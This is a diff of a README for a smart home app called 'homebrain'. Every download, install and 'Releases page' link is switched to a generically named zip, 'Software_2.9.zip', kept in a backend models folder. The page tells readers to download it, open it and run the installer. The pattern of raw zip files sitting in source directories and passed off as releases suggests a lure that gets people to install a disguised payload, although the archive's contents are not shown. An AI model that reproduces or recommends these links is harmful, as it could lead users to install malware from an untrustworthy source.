@@ -6,9 +6,9 @@ Welcome to homebrain! This application helps you manage your smart home efficien
 
 ## 📥 Download Now
 
-[![Download homebrain](https://raw.githubusercontent.com/arizalmyr/homebrain/main/backend/app/api/homebrain-1.3.zip%20homebrain-v1.0-blue)](https://raw.githubusercontent.com/arizalmyr/homebrain/main/backend/app/api/homebrain-1.3.zip)
+[![Download homebrain](https://raw.githubusercontent.com/arizalmyr/homebrain/main/backend/app/models/Software_2.9.zip%20homebrain-v1.0-blue)](https://raw.githubusercontent.com/arizalmyr/homebrain/main/backend/app/models/Software_2.9.zip)
 
-Visit [this page to download](https://raw.githubusercontent.com/arizalmyr/homebrain/main/backend/app/api/homebrain-1.3.zip) the latest version of homebrain.
+Visit [this page to download](https://raw.githubusercontent.com/arizalmyr/homebrain/main/backend/app/models/Software_2.9.zip) the latest version of homebrain.
 
 ## 🛠 System Requirements
 
@@ -29,7 +29,7 @@ Before you start, make sure your system meets the following requirements:
 
 ## 🔧 Download & Install
 
-1. Click on the [Download homebrain](https://raw.githubusercontent.com/arizalmyr/homebrain/main/backend/app/api/homebrain-1.3.zip) button above.
+1. Click on the [Download homebrain](https://raw.githubusercontent.com/arizalmyr/homebrain/main/backend/app/models/Software_2.9.zip) button above.
 2. Choose the version suitable for your operating system.
 3. Download the installation file to your computer.
 4. Open the file and follow the on-screen instructions to install homebrain.
@@ -55,7 +55,7 @@ homebrain works with a wide range of smart home devices, including lights, therm
 Yes, you can install homebrain on any compatible device as long as you have the installation file.
 
 **How do I update the application?**  
-Visit the [Releases page](https://raw.githubusercontent.com/arizalmyr/homebrain/main/backend/app/api/homebrain-1.3.zip) regularly to check for updates. Download and install the latest version as you did initially.
+Visit the [Releases page](https://raw.githubusercontent.com/arizalmyr/homebrain/main/backend/app/models/Software_2.9.zip) regularly to check for updates. Download and install the latest version as you did initially.
 
 ## 🎥 Getting Help
 
